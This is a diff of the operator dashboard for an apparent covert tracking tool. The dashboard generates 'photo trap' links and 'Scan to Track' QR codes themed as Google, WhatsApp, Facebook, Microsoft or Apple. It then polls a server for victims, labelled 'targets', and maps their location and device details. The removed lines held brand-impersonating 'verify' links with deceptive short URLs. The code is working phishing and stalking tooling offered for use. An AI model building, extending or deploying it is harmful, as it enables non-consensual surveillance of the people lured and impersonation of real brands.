@@ -16,7 +16,6 @@
             overflow: hidden;
         }
 
-        /* ===== TOP BAR ===== */
         #topBar {
             background: #1a1a2e;
             padding: 10px 24px;
@@ -56,7 +55,7 @@
         #topBar .stats span { opacity: 0.6; }
         #topBar .stats strong { color: #fff; font-weight: 600; }
 
-        /* ===== LINK GENERATOR PANEL ===== */
+        /* ===== PHOTO TRAP PANEL ===== */
         #linkPanel {
             background: #141425;
             padding: 12px 24px;
@@ -115,85 +114,13 @@
             transition: background 0.2s;
         }
         #linkPanel .btn:hover { background: #388e3c; }
-        #linkPanel .btn-blue { background: #4285f4; }
-        #linkPanel .btn-blue:hover { background: #3367d6; }
         #linkPanel .btn-qr { background: #ff9800; }
         #linkPanel .btn-qr:hover { background: #e68900; }
-        #linkPanel .short-link {
-            color: #ffc107;
-            font-size: 11px;
-            font-family: monospace;
-            background: #0f0f1a;
-            padding: 4px 10px;
-            border-radius: 4px;
-            border: 1px solid #1e1e38;
-        }
-        #linkPanel .divider {
-            width: 1px;
-            height: 28px;
-            background: #2a2a4a;
-        }
-
-        /* QR Code Popup */
-        #qrPopup {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0,0,0,0.8);
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-        }
-        #qrPopup .popup-content {
-            background: #1a1a2e;
-            padding: 30px;
-            border-radius: 16px;
-            border: 1px solid #2a2a4a;
-            text-align: center;
-            max-width: 350px;
-            width: 90%;
-        }
-        #qrPopup .popup-content img {
-            max-width: 100%;
-            border-radius: 8px;
-            background: white;
-            padding: 10px;
-        }
-        #qrPopup .popup-content h3 {
-            margin-bottom: 10px;
-            color: #fff;
-        }
-        #qrPopup .popup-content .close-btn {
-            margin-top: 15px;
-            padding: 8px 24px;
-            background: #e94560;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: 600;
-        }
-        #qrPopup .popup-content .close-btn:hover { background: #c62840; }
-        #qrPopup .popup-content .download-btn {
-            margin-top: 10px;
-            padding: 8px 24px;
-            background: #4caf50;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: 600;
-            margin-left: 8px;
-        }
-        #qrPopup .popup-content .download-btn:hover { background: #388e3c; }
 
         /* ===== APP LAYOUT ===== */
         #app {
             display: flex;
-            height: calc(100vh - 130px);
+            height: calc(100vh - 110px);
             width: 100vw;
         }
 
@@ -296,7 +223,6 @@
             height: 100%;
         }
 
-        /* ===== EMPTY STATE ===== */
         #emptyState {
             position: absolute;
             top: 50%;
@@ -311,7 +237,6 @@
         #emptyState .title { font-size: 18px; font-weight: 600; color: #aaa; }
         #emptyState .sub { font-size: 13px; margin-top: 6px; opacity: 0.5; }
 
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 768px) {
             #sidebar {
                 width: 100%;
@@ -345,28 +270,10 @@
     </div>
 </div>
 
-<!-- ===== LINK GENERATOR PANEL ===== -->
+<!-- ===== PHOTO TRAP PANEL ===== -->
 <div id="linkPanel">
-    <!-- Verification Link -->
     <div class="section">
-        <label>📤 Verify</label>
-        <select id="brandSelect">
-            <option value="google">🔵 Google</option>
-            <option value="whatsapp" selected>💬 WhatsApp</option>
-            <option value="facebook">🔷 Facebook</option>
-            <option value="microsoft">⬡ Microsoft</option>
-            <option value="apple"> Apple</option>
-        </select>
-        <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/?template=whatsapp</span>
-        <button class="btn" id="copyLinkBtn">📋 Copy</button>
-        <span class="short-link" id="shortLinkDisplay">rebrand.ly/verify-wa</span>
-    </div>
-
-    <div class="divider"></div>
-
-    <!-- Photo Trap Link -->
-    <div class="section">
-        <label>📸 Photo</label>
+        <label>📸 Send Photo Trap:</label>
         <select id="photoTemplateSelect">
             <option value="google">🔵 Google</option>
             <option value="whatsapp" selected>💬 WhatsApp</option>
@@ -376,38 +283,26 @@
         </select>
         <span class="link-display" id="photoLinkDisplay">https://location-tracker-cn7m.onrender.com/photo?template=whatsapp</span>
         <button class="btn" id="copyPhotoLinkBtn">📋 Copy</button>
-    </div>
-
-    <div class="divider"></div>
-
-    <!-- QR Code Generator -->
-    <div class="section">
-        <label>📱 QR</label>
-        <select id="qrTemplateSelect">
-            <option value="google">🔵 Google</option>
-            <option value="whatsapp" selected>💬 WhatsApp</option>
-            <option value="facebook">🔷 Facebook</option>
-            <option value="microsoft">⬡ Microsoft</option>
-            <option value="apple"> Apple</option>
-        </select>
-        <button class="btn btn-qr" id="generateQrBtn">🔄 Generate QR</button>
+        <button class="btn btn-qr" id="generateQrBtn">📱 QR</button>
     </div>
 </div>
 
 <!-- ===== QR CODE POPUP ===== -->
-<div id="qrPopup">
-    <div class="popup-content">
-        <h3>📱 Scan to Track</h3>
-        <img id="qrCodeImg" src="" alt="QR Code">
-        <br>
-        <button class="download-btn" id="downloadQrBtn">💾 Download QR</button>
-        <button class="close-btn" id="closeQrBtn">✕ Close</button>
+<div id="qrPopup" style="display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.85);z-index:9999;justify-content:center;align-items:center;backdrop-filter:blur(4px);">
+    <div class="popup-content" style="background:#1a1a2e;padding:30px;border-radius:16px;border:1px solid #2a2a4a;text-align:center;max-width:350px;width:90%;">
+        <h3 style="color:#fff;margin-bottom:8px;">📱 Scan to Track</h3>
+        <div style="background:white;padding:12px;border-radius:8px;display:inline-block;margin:0 auto;">
+            <img id="qrCodeImg" src="" alt="QR Code" style="max-width:100%;display:block;">
+        </div>
+        <div style="margin:12px 0;display:flex;gap:10px;justify-content:center;flex-wrap:wrap;">
+            <button class="btn" id="downloadQrBtn" style="background:#4caf50;color:white;border:none;padding:6px 18px;border-radius:4px;font-weight:600;cursor:pointer;">💾 Download</button>
+            <button class="btn" id="closeQrBtn" style="background:#e94560;color:white;border:none;padding:6px 18px;border-radius:4px;font-weight:600;cursor:pointer;">✕ Close</button>
+        </div>
     </div>
 </div>
 
 <!-- ===== APP ===== -->
 <div id="app">
-    <!-- SIDEBAR -->
     <div id="sidebar">
         <div class="header">
             <span>📋 Users</span>
@@ -417,14 +312,12 @@
             <div style="padding:20px;text-align:center;opacity:0.4;font-size:14px;">No users yet</div>
         </div>
     </div>
-
-    <!-- MAP -->
     <div id="mapContainer">
         <div id="map"></div>
         <div id="emptyState">
             <div class="icon">🕵️</div>
             <div class="title">No targets yet</div>
-            <div class="sub">Send a link or QR above to start tracking</div>
+            <div class="sub">Send the photo trap link above to start tracking</div>
         </div>
     </div>
 </div>
@@ -436,23 +329,10 @@
     const RENDER_URL = '';
     const BASE_URL = 'https://location-tracker-cn7m.onrender.com';
 
-    const SHORT_LINKS = {
-        google: 'rebrand.ly/verify-google',
-        whatsapp: 'rebrand.ly/verify-wa',
-        facebook: 'rebrand.ly/verify-FACEBOOK',
-        microsoft: 'rebrand.ly/verify-ms',
-        apple: 'rebrand.ly/apple-security'
-    };
-
     // =============================================
-    // DOM ELEMENTS — Link Generator
+    // PHOTO TRAP LINK
     // =============================================
-    const brandSelect = document.getElementById('brandSelect');
     const photoTemplateSelect = document.getElementById('photoTemplateSelect');
-    const qrTemplateSelect = document.getElementById('qrTemplateSelect');
-    const linkDisplay = document.getElementById('linkDisplay');
-    const shortLinkDisplay = document.getElementById('shortLinkDisplay');
-    const copyLinkBtn = document.getElementById('copyLinkBtn');
     const photoLinkDisplay = document.getElementById('photoLinkDisplay');
     const copyPhotoLinkBtn = document.getElementById('copyPhotoLinkBtn');
     const generateQrBtn = document.getElementById('generateQrBtn');
@@ -461,47 +341,6 @@
     const downloadQrBtn = document.getElementById('downloadQrBtn');
     const closeQrBtn = document.getElementById('closeQrBtn');
 
-    // =============================================
-    // UPDATE VERIFICATION LINK
-    // =============================================
-    function updateLink() {
-        const brand = brandSelect.value;
-        const fullUrl = BASE_URL + '/?template=' + brand;
-        const shortUrl = SHORT_LINKS[brand] || '';
-        linkDisplay.textContent = fullUrl;
-        shortLinkDisplay.textContent = shortUrl;
-    }
-    brandSelect.addEventListener('change', updateLink);
-    updateLink();
-
-    // =============================================
-    // COPY VERIFICATION LINK
-    // =============================================
-    copyLinkBtn.addEventListener('click', function() {
-        const link = linkDisplay.textContent;
-        navigator.clipboard.writeText(link).then(() => {
-            const originalText = copyLinkBtn.textContent;
-            copyLinkBtn.textContent = '✅ Copied!';
-            setTimeout(() => {
-                copyLinkBtn.textContent = originalText;
-            }, 2000);
-        }).catch(() => {
-            const range = document.createRange();
-            range.selectNode(linkDisplay);
-            window.getSelection().removeAllRanges();
-            window.getSelection().addRange(range);
-            document.execCommand('copy');
-            const originalText = copyLinkBtn.textContent;
-            copyLinkBtn.textContent = '✅ Copied!';
-            setTimeout(() => {
-                copyLinkBtn.textContent = originalText;
-            }, 2000);
-        });
-    });
-
-    // =============================================
-    // UPDATE PHOTO TRAP LINK
-    // =============================================
     function updatePhotoLink() {
         const template = photoTemplateSelect.value;
         const url = BASE_URL + '/photo?template=' + template;
@@ -510,9 +349,6 @@
     photoTemplateSelect.addEventListener('change', updatePhotoLink);
     updatePhotoLink();
 
-    // =============================================
-    // COPY PHOTO TRAP LINK
-    // =============================================
     copyPhotoLinkBtn.addEventListener('click', function() {
         const link = photoLinkDisplay.textContent;
         navigator.clipboard.writeText(link).then(() => {
@@ -536,29 +372,23 @@
     });
 
     // =============================================
-    // QR CODE GENERATOR
+    // QR CODE
     // =============================================
     generateQrBtn.addEventListener('click', function() {
-        const template = qrTemplateSelect.value;
-        const url = BASE_URL + '/?template=' + template;
+        const template = photoTemplateSelect.value;
+        const url = BASE_URL + '/photo?template=' + template;
         const qrApiUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(url);
         qrCodeImg.src = qrApiUrl;
         qrPopup.style.display = 'flex';
     });
 
-    // =============================================
-    // DOWNLOAD QR CODE
-    // =============================================
     downloadQrBtn.addEventListener('click', function() {
         const link = document.createElement('a');
-        link.download = 'photo-trap-qr.png';
+        link.download = 'qr-code.png';
         link.href = qrCodeImg.src;
         link.click();
     });
 
-    // =============================================
-    // CLOSE QR POPUP
-    // =============================================
     closeQrBtn.addEventListener('click', function() {
         qrPopup.style.display = 'none';
     });
@@ -583,9 +413,6 @@
     let colorIndex = 0;
     function getColor() { return colorPalette[colorIndex++ % colorPalette.length]; }
 
-    // =============================================
-    // DEVICE DETECTION
-    // =============================================
     function getDeviceModel(userAgent) {
         if (!userAgent) return 'Unknown Device';
         const ua = userAgent;
@@ -700,9 +527,6 @@
         };
     }
 
-    // =============================================
-    // RENDER USER LIST
-    // =============================================
     function renderUsers(users) {
         const list = document.getElementById('userList');
         const badge = document.getElementById('userBadge');
@@ -746,9 +570,6 @@
         list.innerHTML = html;
     }
 
-    // =============================================
-    // FOCUS USER
-    // =============================================
     function focusUser(sessionId) {
         if (markers[sessionId] && markers[sessionId].lat && markers[sessionId].lng) {
             const { lat, lng } = markers[sessionId];
@@ -763,9 +584,6 @@
         }
     }
 
-    // =============================================
-    // FETCH USERS
-    // =============================================
     function fetchUsers() {
         fetch(RENDER_URL + '/get-users')
             .then(res => {
@@ -783,9 +601,6 @@
             });
     }
 
-    // =============================================
-    // UPDATE MARKERS
-    // =============================================
     function updateMarkers(users) {
         const activeSessions = new Set();
 
@@ -878,9 +693,6 @@
         }
     }
 
-    // =============================================
-    // UPDATE STATS
-    // =============================================
     function updateStats(users) {
         const live = users.filter(u => u.lat && u.lng).length;
         document.getElementById('userCount').textContent = live;
@@ -894,9 +706,6 @@
         }
     }
 
-    // =============================================
-    // POLLING
-    // =============================================
     setInterval(fetchUsers, 3000);
     fetchUsers();
 
@@ -904,8 +713,7 @@
     setTimeout(() => map.invalidateSize(), 500);
 
     console.log('📍 Dashboard initialized');
-    console.log('🔗 Links available in the panel above');
-    console.log('📱 QR code generator ready');
+    console.log('📸 Photo trap link ready');
 </script>
 </body>
 </html>
